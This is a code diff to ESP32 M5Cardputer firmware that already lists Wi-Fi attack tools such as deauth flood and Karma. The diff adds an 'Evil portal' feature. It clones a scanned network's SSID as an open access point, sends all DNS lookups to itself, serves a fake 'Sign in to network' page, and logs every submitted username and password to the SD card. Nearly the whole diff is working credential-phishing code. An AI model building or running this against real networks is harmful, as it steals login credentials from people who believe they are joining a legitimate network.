@@ -4,7 +4,9 @@
 #include <cstring>
 #include <M5Cardputer.h>
 #include <SD.h>
+#include <DNSServer.h>
 #include <SPI.h>
+#include <WebServer.h>
 #include <WiFi.h>
 #include "esp_wifi.h"
 
@@ -18,7 +20,7 @@ const char *const MENU_ITEMS[] = {"WiFi", "BLE", "RF 433MHz", "NRF24 2.4GHz", "I
 constexpr int MENU_COUNT = sizeof(MENU_ITEMS) / sizeof(MENU_ITEMS[0]);
 constexpr int WIFI_ITEM = 0;
 
-const char *const WIFI_TOOLS[] = {"Scan networks", "Channel analyzer", "Packet sniffer", "Beacon spam", "Deauth flood", "Karma", "Handshake capture"};
+const char *const WIFI_TOOLS[] = {"Scan networks", "Channel analyzer", "Packet sniffer", "Beacon spam", "Deauth flood", "Karma", "Handshake capture", "Evil portal"};
 constexpr int WIFI_TOOL_COUNT = sizeof(WIFI_TOOLS) / sizeof(WIFI_TOOLS[0]);
 constexpr int WIFI_TOOL_SCAN = 0;
 constexpr int WIFI_TOOL_CHANNELS = 1;
@@ -27,6 +29,7 @@ constexpr int WIFI_TOOL_BEACON = 3;
 constexpr int WIFI_TOOL_DEAUTH = 4;
 constexpr int WIFI_TOOL_KARMA = 5;
 constexpr int WIFI_TOOL_HANDSHAKE = 6;
+constexpr int WIFI_TOOL_PORTAL = 7;
 
 constexpr int WIFI_VISIBLE_ROWS = 8;
 constexpr int CH_FIRST = 1;
@@ -35,7 +38,7 @@ constexpr uint32_t CH_DWELL_MS = 300;
 constexpr int BAR_BASE_Y = 108;
 constexpr int BAR_MAX_H = 72;
 
-enum class Screen { Menu, Placeholder, WifiMenu, WifiScan, WifiChannels, WifiSniff, WifiSpamSelect, WifiSpamText, WifiSpamRun, WifiDeauthSelect, WifiDeauthCheck, WifiDeauthRun, WifiKarmaRun, WifiHsRun };
+enum class Screen { Menu, Placeholder, WifiMenu, WifiScan, WifiChannels, WifiSniff, WifiSpamSelect, WifiSpamText, WifiSpamRun, WifiDeauthSelect, WifiDeauthCheck, WifiDeauthRun, WifiKarmaRun, WifiHsRun, WifiPortalRun };
 
 Screen screen = Screen::Menu;
 int selected = 0;
@@ -963,7 +966,7 @@ const char *verdictTag(PmfVerdict v) {
     }
 }
 
-enum ListPurpose : uint8_t { PURPOSE_DEAUTH, PURPOSE_HANDSHAKE };
+enum ListPurpose : uint8_t { PURPOSE_DEAUTH, PURPOSE_HANDSHAKE, PURPOSE_PORTAL };
 ListPurpose listPurpose = PURPOSE_DEAUTH;
 
 const char *rowTag(int idx) {
@@ -981,7 +984,8 @@ void drawDeauthSelect() {
         snprintf(header, sizeof(header), "Checking ch%-2d  sweep %d/%d", pmfPassCh, pmfPassSweep + 1, PMF_SWEEPS);
     } else {
         snprintf(header, sizeof(header), "%s: %d networks (dBm)",
-                 listPurpose == PURPOSE_HANDSHAKE ? "Handshake" : "Deauth", dlCount);
+                 listPurpose == PURPOSE_HANDSHAKE ? "Handshake" : (listPurpose == PURPOSE_PORTAL ? "Portal" : "Deauth"),
+                 dlCount);
     }
     d.drawString(header, 4, 4);
     for (int row = 0; row < WIFI_VISIBLE_ROWS; row++) {
@@ -1006,6 +1010,8 @@ void drawDeauthSelect() {
         d.drawString("Bksp cancel check", 4, 124);
     } else if (listPurpose == PURPOSE_HANDSHAKE) {
         d.drawString("Enter capture  R sweep  Bksp back", 4, 124);
+    } else if (listPurpose == PURPOSE_PORTAL) {
+        d.drawString("Enter pick SSID  Bksp back", 4, 124);
     } else {
         d.drawString("Enter check  R recheck  Bksp back", 4, 124);
     }
@@ -1483,7 +1489,7 @@ void drawHandshake() {
     d.drawString("Enter run  D deauth  Bksp back", 4, 124);
 }
 
-void enterHandshakeSelect() {
+void enterScanList() {
     attackRadio();
     drawWifiMessage("Scanning...");
     WiFi.scanDelete();
@@ -1531,6 +1537,182 @@ void tickHandshake() {
     }
 }
 
+constexpr size_t PORTAL_PAGE_MAX = 24576;
+constexpr char PORTAL_TEMPLATE_DIR[] = "/PortalTemplates";
+constexpr char PORTAL_CREDS_DIR[] = "/BruceEvilCreds";
+const char *const PORTAL_DEFAULT_PAGE = R"HTML(<!DOCTYPE html>
+<html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in</title></head>
+<body style="font-family:sans-serif;max-width:340px;margin:40px auto;padding:0 16px">
+<h2>Sign in to network</h2>
+<form method="POST" action="/post">
+<input name="username" placeholder="Username" style="width:100%;padding:8px;margin:6px 0;box-sizing:border-box">
+<input name="password" type="password" placeholder="Password" style="width:100%;padding:8px;margin:6px 0;box-sizing:border-box">
+<button type="submit" style="width:100%;padding:10px;margin-top:8px">Connect</button>
+</form></body></html>)HTML";
+
+WebServer portalServer(80);
+DNSServer portalDns;
+bool portalRunning = false;
+bool portalRoutesAdded = false;
+String portalPage;
+char portalTemplateName[40] = "built-in";
+uint32_t portalViews = 0;
+uint32_t portalCaptured = 0;
+char portalLast[41] = "";
+char portalCredsName[64] = "";
+uint32_t portalLastDraw = 0;
+
+bool loadPortalPage(String &out) {
+    out = "";
+    if (!SD.exists(PORTAL_TEMPLATE_DIR)) return false;
+    File dir = SD.open(PORTAL_TEMPLATE_DIR);
+    if (!dir || !dir.isDirectory()) return false;
+    File f = dir.openNextFile();
+    while (f) {
+        String fname = String(f.name());
+        if (fname.endsWith(".html") || fname.endsWith(".htm")) {
+            if (f.size() > PORTAL_PAGE_MAX) break;
+            out.reserve(f.size());
+            while (f.available()) out += static_cast<char>(f.read());
+            snprintf(portalTemplateName, sizeof(portalTemplateName), "%s", fname.c_str());
+            f.close();
+            dir.close();
+            return true;
+        }
+        f.close();
+        f = dir.openNextFile();
+    }
+    dir.close();
+    return false;
+}
+
+void portalRedirect() {
+    portalServer.sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/", true);
+    portalServer.send(302, "text/plain", "");
+}
+
+void portalHandleRoot() {
+    String host = portalServer.hostHeader();
+    if (host.length() && host != WiFi.softAPIP().toString()) {
+        portalRedirect();
+        return;
+    }
+    portalViews++;
+    portalServer.send(200, "text/html", portalPage);
+}
+
+void portalCredsPath(char *out, size_t n) {
+    char safe[SPAM_SSID_MAX + 1];
+    size_t j = 0;
+    for (size_t i = 0; deauthSsid[i] != '\0' && j < SPAM_SSID_MAX; i++) {
+        char c = deauthSsid[i];
+        safe[j++] = (isalnum(static_cast<unsigned char>(c)) || c == '-' || c == '_') ? c : '_';
+    }
+    safe[j] = '\0';
+    snprintf(out, n, "%s/%s_creds.csv", PORTAL_CREDS_DIR, safe);
+}
+
+void portalHandlePost() {
+    if (portalServer.args() == 0) {
+        portalRedirect();
+        return;
+    }
+    String line = String(millis()) + ", ssid: " + deauthSsid;
+    String lastVal = "";
+    for (int i = 0; i < portalServer.args(); i++) {
+        String key = portalServer.argName(i);
+        String val = portalServer.arg(i);
+        line += ", " + key + ": " + val;
+        lastVal = val;
+    }
+    if (!SD.exists(PORTAL_CREDS_DIR)) SD.mkdir(PORTAL_CREDS_DIR);
+    char path[96];
+    portalCredsPath(path, sizeof(path));
+    File f = SD.open(path, FILE_APPEND);
+    if (f) {
+        f.println(line);
+        f.close();
+    }
+    snprintf(portalCredsName, sizeof(portalCredsName), "%s", path);
+    portalCaptured++;
+    snprintf(portalLast, sizeof(portalLast), "%s", lastVal.c_str());
+    portalServer.send(200, "text/html", "<html><body style=\"font-family:sans-serif\"><p>Connecting, please wait...</p></body></html>");
+}
+
+void drawPortal() {
+    auto &d = M5Cardputer.Display;
+    d.fillScreen(COLOR_BG);
+    d.setTextSize(1);
+    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
+    char line[64];
+    snprintf(line, sizeof(line), "Evil portal  ch%-2d  %s", deauthCh, portalRunning ? "RUNNING" : "stopped");
+    d.drawString(line, 4, 4);
+    snprintf(line, sizeof(line), "SSID: %s", deauthSsid);
+    d.drawString(line, 4, 16);
+    snprintf(line, sizeof(line), "Template: %s", portalTemplateName);
+    d.drawString(line, 4, 28);
+    snprintf(line, sizeof(line), "Page views %lu  captured %lu", (unsigned long)portalViews,
+             (unsigned long)portalCaptured);
+    d.drawString(line, 4, 40);
+    snprintf(line, sizeof(line), "Last: %s", portalLast);
+    d.drawString(line, 4, 52);
+    if (portalCredsName[0] != '\0') {
+        snprintf(line, sizeof(line), "Saved: %s", portalCredsName);
+        d.drawString(line, 4, 64);
+    }
+    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
+    d.drawString("Enter start/stop  Bksp back", 4, 124);
+}
+
+void startPortal() {
+    if (!ensureSd()) {
+        snprintf(portalLast, sizeof(portalLast), "no SD card found");
+        return;
+    }
+    if (!loadPortalPage(portalPage)) {
+        portalPage = PORTAL_DEFAULT_PAGE;
+        snprintf(portalTemplateName, sizeof(portalTemplateName), "built-in");
+    }
+    WiFi.mode(WIFI_AP);
+    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+    if (!WiFi.softAP(deauthSsid, nullptr, deauthCh, 0, 4)) {
+        snprintf(portalLast, sizeof(portalLast), "softAP failed");
+        return;
+    }
+    if (!portalRoutesAdded) {
+        portalServer.on("/", HTTP_GET, portalHandleRoot);
+        portalServer.on("/post", HTTP_POST, portalHandlePost);
+        portalServer.onNotFound(portalRedirect);
+        portalRoutesAdded = true;
+    }
+    portalDns.start(53, "*", WiFi.softAPIP());
+    portalServer.begin();
+    portalViews = 0;
+    portalCaptured = 0;
+    portalLast[0] = '\0';
+    portalCredsName[0] = '\0';
+    portalRunning = true;
+    portalLastDraw = 0;
+}
+
+void stopPortal() {
+    if (!portalRunning) return;
+    portalRunning = false;
+    portalServer.stop();
+    portalDns.stop();
+    WiFi.softAPdisconnect(false);
+}
+
+void tickPortal() {
+    if (!portalRunning) return;
+    portalServer.handleClient();
+    uint32_t now = millis();
+    if (now - portalLastDraw >= 1000) {
+        portalLastDraw = now;
+        drawPortal();
+    }
+}
+
 bool wordHas(const std::vector<char> &word, char c) {
     for (char w : word) {
         if (tolower(w) == c) return true;
@@ -1565,6 +1747,7 @@ void loop() {
         pcapFlush(8192);
         tickHandshake();
     }
+    if (screen == Screen::WifiPortalRun) tickPortal();
     if (!M5Cardputer.Keyboard.isChange() || !M5Cardputer.Keyboard.isPressed()) return;
 
     auto &ks = M5Cardputer.Keyboard.keysState();
@@ -1630,7 +1813,11 @@ void loop() {
             } else if (wifiToolSel == WIFI_TOOL_HANDSHAKE) {
                 screen = Screen::WifiDeauthSelect;
                 listPurpose = PURPOSE_HANDSHAKE;
-                enterHandshakeSelect();
+                enterScanList();
+            } else if (wifiToolSel == WIFI_TOOL_PORTAL) {
+                screen = Screen::WifiDeauthSelect;
+                listPurpose = PURPOSE_PORTAL;
+                enterScanList();
             } else if (wifiToolSel == WIFI_TOOL_KARMA) {
                 screen = Screen::WifiKarmaRun;
                 startKarma();
@@ -1789,6 +1976,10 @@ void loop() {
                 if (listPurpose == PURPOSE_HANDSHAKE) {
                     screen = Screen::WifiHsRun;
                     drawHandshake();
+                } else if (listPurpose == PURPOSE_PORTAL) {
+                    screen = Screen::WifiPortalRun;
+                    startPortal();
+                    drawPortal();
                 } else {
                     screen = Screen::WifiDeauthCheck;
                     startDeauthCheck();
@@ -1867,6 +2058,21 @@ void loop() {
         } else if (wordHas(ks.word, 'd')) {
             hsDeauth = !hsDeauth;
             drawHandshake();
+        }
+        break;
+
+    case Screen::WifiPortalRun:
+        if (back) {
+            stopPortal();
+            screen = Screen::WifiDeauthSelect;
+            drawDeauthSelect();
+        } else if (ks.enter) {
+            if (portalRunning) {
+                stopPortal();
+            } else {
+                startPortal();
+            }
+            drawPortal();
         }
         break;
     }
